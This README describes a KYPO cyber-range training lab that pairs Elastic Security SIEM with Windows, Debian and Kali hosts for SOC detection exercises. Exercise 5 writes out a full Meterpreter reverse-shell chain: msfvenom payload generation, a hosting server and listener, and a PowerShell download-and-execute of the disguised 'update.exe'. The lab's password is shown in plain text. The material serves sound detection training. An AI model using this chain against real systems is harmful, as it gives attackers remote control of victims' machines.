# Elastic Security Detection Lab

A complete hands-on cybersecurity training lab featuring Elastic Security SIEM with automated threat detection, monitoring, and incident response capabilities. This lab is designed for CyberRangeCZ/KYPO platform and adapted from [Ludus](https://ludus.cloud) badsectorlabs roles.

> 🎓 **Perfect for**: SOC Analysts, Security Engineers, Detection Engineers, Incident Responders, and Cybersecurity Students

---

## 📋 Table of Contents

- [What is This Lab?](#what-is-this-lab)
- [What You'll Learn](#what-youll-learn)
- [Lab Architecture](#lab-architecture)
- [Prerequisites](#prerequisites)
- [Quick Start Guide](#quick-start-guide)
- [Detailed Setup Instructions](#detailed-setup-instructions)
- [Using the Lab](#using-the-lab)
- [Training Exercises](#training-exercises)
- [Troubleshooting](#troubleshooting)
- [Advanced Configuration](#advanced-configuration)
- [Contributing](#contributing)
- [Credits](#credits)

---

## 🎯 What is This Lab?

This lab creates a complete cybersecurity environment where you can:

- **Monitor security events** from Windows and Linux systems in real-time
- **Detect threats** using pre-built and custom detection rules
- **Investigate alerts** like a real SOC analyst
- **Practice attacks** in a safe, isolated environment
- **Learn SIEM operations** with industry-standard tools

### Components

| Component | Description | IP Address |
|-----------|-------------|------------|
| **Elastic Server** | Central logging and analysis platform (Elasticsearch + Kibana + Fleet) | 10.20.30.10 |
| **Windows Endpoint** | Windows 10 machine with monitoring agents (Elastic Agent + Sysmon) | 10.20.30.30 |
| **Debian Endpoint** | Linux machine with Elastic Agent for monitoring | 10.20.30.20 |
| **Kali Attacker** | Attack simulation machine with Metasploit and penetration testing tools | 10.20.30.100 |

---

## 📚 What You'll Learn

By completing this lab, you will:

1. ✅ Deploy and configure Elastic Security SIEM
2. ✅ Install and manage Elastic Agents on Windows and Linux
3. ✅ Query security logs using KQL (Kibana Query Language)
4. ✅ Create custom detection rules for threats
5. ✅ Investigate security alerts and incidents
6. ✅ Detect malicious PowerShell, Meterpreter, and other attack techniques
7. ✅ Understand MITRE ATT&CK framework integration
8. ✅ Practice real-world SOC analyst workflows

---

## 🏗️ Lab Architecture

                ┌─────────────────────────┐
                │   Elastic Server        │
                │   (10.20.30.10)        │
                │                         │
                │  -  Elasticsearch       │
                │  -  Kibana              │
                │  -  Fleet Server        │
                └───────────┬─────────────┘
                            │
            ┌───────────────┼───────────────┐
            │               │               │
    ┌───────▼──────┐ ┌─────▼──────┐ ┌─────▼──────┐
    │   Windows    │ │   Debian   │ │    Kali    │
    │  Endpoint    │ │  Endpoint  │ │  Attacker  │
    │ (.30)        │ │ (.20)      │ │ (.100)     │
    │              │ │            │ │            │
    │ -  Agent      │ │ -  Agent    │ │ -  Metasploit│
    │ -  Sysmon     │ │            │ │ -  Tools     │
    └──────────────┘ └────────────┘ └────────────┘


---

## 🔧 Prerequisites

### Required

- **KYPO/CyberRangeCZ Platform Access** - You need an account on a KYPO deployment
- **GitLab/GitHub Account** - To store and version control your lab configuration
- **Basic Linux Knowledge** - Familiarity with terminal commands
- **Basic Networking Understanding** - Know what IP addresses and ports are

### System Requirements (KYPO will provide these)

- Minimum: 16GB RAM, 4 vCPUs, 200GB storage
- Base Images Required:
  - `debian-12-x86_64`
  - `windows-10`
  - `kali-linux-2024`

---

## 🚀 Quick Start Guide

### For Complete Beginners

**Step 1: Get This Code**

git remote set-url origin https://your-kypo-gitlab.com/your-username/elastic-security-lab.git
git push -u origin main

text

**Step 3: Deploy in KYPO**

1. Log into your KYPO platform web interface
2. Navigate to **Sandbox Definitions** → **Create New Definition**
3. Fill in:
   - **Name**: `elastic-security-lab`
   - **Git URL**: Your repository URL (GitHub or GitLab)
   - **Branch**: `main`
   - **Topology File**: `topology.yml`
4. Click **Save**

**Step 4: Create a Sandbox**

1. Go to **Sandboxes** → **Create Sandbox**
2. Select **elastic-security-lab** definition
3. Choose your resource pool
4. Click **Deploy**
5. **Wait 30-45 minutes** for deployment to complete

**Step 5: Access Kibana**

1. Once deployment is complete, find the **elastic-server** IP (should be 10.20.30.10)
2. Open a browser and go to: `https://10.20.30.10:5601`
3. Accept the SSL warning (it's a self-signed certificate)
4. Login with:
   - **Username**: `elastic`
   - **Password**: `ElasticSecurityLab2025!`

🎉 **You're in!** Start with the [Training Exercises](#training-exercises) below.

---

## 📖 Detailed Setup Instructions

### Understanding the Files

elastic-security-lab/
├── topology.yml # Defines VMs, networks, IPs
├── README.md # This file!
├── provisioning/
│ ├── playbook.yml # Main automation script
│ ├── group_vars/
│ │ └── all.yml # Configuration variables
│ └── roles/
│ ├── elastic_container/ # Installs Elastic Stack
│ ├── elastic_agent/ # Installs agents on endpoints
│ ├── kali_attacker/ # Configures attacker machine
│ └── windows_endpoint/ # Configures Windows machine

text

### Customization

#### Change Passwords

Edit `provisioning/group_vars/all.yml`:

elastic_password: "YourNewSecurePassword123!"

text

#### Change IP Addresses

Edit `topology.yml`:

net_mappings:

host: elastic-server
network: security-net
ip: 10.20.30.10 # Change this IP

text

#### Change Elastic Stack Version

Edit `provisioning/group_vars/all.yml`:

elastic_stack_version: "8.12.2" # Update to newer version

text

---

## 🎮 Using the Lab

### Accessing Systems

**Via KYPO Web Interface:**
- Navigate to your sandbox
- Click on any host to access console or RDP/SSH

**Direct Access (from within KYPO network):**

SSH to Debian endpoint
ssh debian@10.20.30.20

SSH to Kali attacker
ssh kali@10.20.30.100

RDP to Windows endpoint
Use RDP client to connect to 10.20.30.30
text

### Kibana Navigation

Once logged into Kibana:

1. **Main Menu** (☰) → Explore all features
2. **Discover** → Query and explore logs
3. **Security** → Security-focused views and dashboards
4. **Fleet** → Manage agents
5. **Alerts** → View triggered detection rules

---

## 🏋️ Training Exercises

### Exercise 1: Verify Agent Health

**Objective**: Confirm all endpoints are reporting to Elastic

1. Log into Kibana
2. Click **☰ Menu** → **Management** → **Fleet**
3. Click **Agents** tab
4. Verify 2 healthy agents (Windows and Debian)

✅ **Success**: Both agents show "Healthy" status with green checkmarks

---

### Exercise 2: Query Security Events

**Objective**: Learn to search security logs with KQL

1. Click **☰ Menu** → **Analytics** → **Discover**
2. Select data view: **logs-***
3. Set time range: **Last 15 minutes**
4. Try this query:

event.category: "process" and event.type: "start"

text

5. Explore the results - these are all processes started on your endpoints

✅ **Success**: You see process creation events with details like process names, command lines, users

---

### Exercise 3: Create a Detection Rule

**Objective**: Build your first threat detection rule

1. Click **☰ Menu** → **Security** → **Rules**
2. Click **Detection rules (SIEM)** tab
3. Click **Create new rule**
4. Choose **Custom query**
5. Enter this KQL query:

event.category: "process" and event.type: "start" and
process.name: "powershell.exe" and
process.command_line: (-enc or -encodedcommand)

text

6. Set Index patterns: `logs-*`
7. Click **Continue**
8. Configure:
   - **Name**: `Suspicious Encoded PowerShell`
   - **Severity**: `High`
   - **Risk Score**: `75`
9. Click **Create & enable rule**

✅ **Success**: Your rule is active and will alert on encoded PowerShell commands

---

### Exercise 4: Generate Test Activity

**Objective**: Trigger your detection rule

1. Access the Windows endpoint (10.20.30.30)
2. Open PowerShell
3. Run this harmless test command:

powershell.exe -encodedcommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAVABlAHMAdABpAG4AZwAgAEUAbgBjAG8AZABlAGQAIABDAG8AbQBtAGEAbgBkACIA

text

4. You should see output: `Testing Encoded Command`
5. Wait 5 minutes for the detection rule to run
6. In Kibana: **Security** → **Alerts**
7. Find your `Suspicious Encoded PowerShell` alert

✅ **Success**: Alert appears with details about the PowerShell execution

---

### Exercise 5: Simulate Real Attack (Advanced)

**Objective**: Practice detecting Meterpreter payload

**⚠️ Warning**: Only perform in isolated lab environment!

#### Part A: Generate Payload (Kali Attacker)

SSH to kali-attacker (10.20.30.100)
ssh kali@10.20.30.100

Generate Meterpreter payload
msfvenom -p windows/meterpreter/reverse_tcp
LHOST=10.20.30.100
LPORT=4444
-f exe
-o /tmp/update.exe

Start HTTP server to host payload
cd /tmp
python3 -m http.server 8080

text

#### Part B: Set Up Listener (Kali - New Terminal)

Start Metasploit
msfconsole -q

Configure handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.20.30.100
set LPORT 4444
exploit -j

text

#### Part C: Download & Execute (Windows Endpoint)

Download payload
Invoke-WebRequest -Uri http://10.20.30.100:8080/update.exe -OutFile C:\Users\Public\update.exe

Execute (Elastic Defend may block this!)
C:\Users\Public\update.exe

text

#### Part D: Check Detection (Kibana)

1. Go to **Security** → **Alerts**
2. Look for alerts like:
   - Malware Prevention Alert
   - Suspicious Executable Download
   - Network Connection to Suspicious IP

✅ **Success**: Elastic Defend blocks or alerts on the malicious payload

---

## 🐛 Troubleshooting

### Problem: Agents Not Showing in Fleet

**Solution:**

SSH to elastic-server
ssh debian@10.20.30.10

Check enrollment token exists
cat /opt/elastic-container/enrollment_token.txt

Check Docker containers are running
docker ps

Restart if needed
cd /opt/elastic-container
./elastic-container.sh restart

text

### Problem: Can't Access Kibana

**Solution:**

1. Verify elastic-server is running in KYPO
2. Check you're using HTTPS (not HTTP): `https://10.20.30.10:5601`
3. Accept the SSL certificate warning
4. Verify password is correct: `ElasticSecurityLab2025!`

### Problem: Detection Rules Not Triggering

**Solution:**

1. Verify rule is **enabled**: Security → Rules → Check status
2. Rules run every 5 minutes by default - wait and refresh
3. Check time range in Kibana includes when you generated activity
4. Verify agents are sending data: Discover → Query for recent events

### Problem: Windows Agent Won't Install

**Solution:**

On Windows endpoint, check if agent is already installed
Get-Service "Elastic Agent"

If exists, uninstall first
cd "C:\Program Files\Elastic\Agent"
.\elastic-agent.exe uninstall

Then KYPO provisioning will reinstall it
text

---

## 🔬 Advanced Configuration

### Enable Additional Integrations

1. In Kibana: **Management** → **Integrations**
2. Browse available integrations (Windows, Linux, Network, Cloud)
3. Click integration → **Add Windows** (or other)
4. Select your agent policy
5. Configure and save

### Add Custom Sysmon Configuration

Edit `provisioning/group_vars/all.yml`:

sysmon_config_url: "https://your-custom-sysmon-config.xml"

text

### Scale Up Resources

Edit `topology.yml`:

hosts:

name: elastic-server
flavor: standard.xxlarge # Increase from xlarge
volumes:

size: 200 # Increase from 100GB

text

---

## 🤝 Contributing

Found a bug? Have an improvement? Contributions welcome!

1. Fork this repository
2. Create a feature branch: `git checkout -b feature/my-improvement`
3. Make your changes
4. Test in KYPO
5. Submit a pull request

### Reporting Issues

Open an issue on GitHub with:
- Description of the problem
- Steps to reproduce
- Expected vs actual behavior
- KYPO/Elastic version info

---

## 📜 Credits

### Based On

- **Ludus Elastic Roles** by [Bad Sector Labs](https://github.com/badsectorlabs)
  - [ludus_elastic_container](https://github.com/badsectorlabs/ludus_elastic_container)
  - [ludus_elastic_agent](https://github.com/badsectorlabs/ludus_elastic_agent)
- **Elastic Container Project** by [Andrew Pease](https://github.com/peasead/elastic-container)
- **SwiftOnSecurity Sysmon Config** by [SwiftOnSecurity](https://github.com/SwiftOnSecurity/sysmon-config)

### Adapted For

- **CyberRangeCZ/KYPO Platform** - Masaryk University's cyber range platform
- **Training & Education** - SOC analyst and security engineering training

### License

Educational use only. This lab is intended for cybersecurity training and research purposes.

### Author

Created and maintained by [lmakonem](https://github.com/lmakonem)

---

## 📞 Support

- **GitHub Issues**: [Report bugs or request features](https://github.com/lmakonem/elastic-security-lab/issues)
- **KYPO Documentation**: [KYPO Platform Docs](https://docs.platform.cyberrange.cz/)
- **Elastic Documentation**: [Elastic Security Docs](https://www.elastic.co/guide/en/security/current/index.html)

---

## ⭐ Star This Repo

If this lab helped you learn, please ⭐ star this repository to help others find it!

---

**Happy Hunting! 🎯🔍**
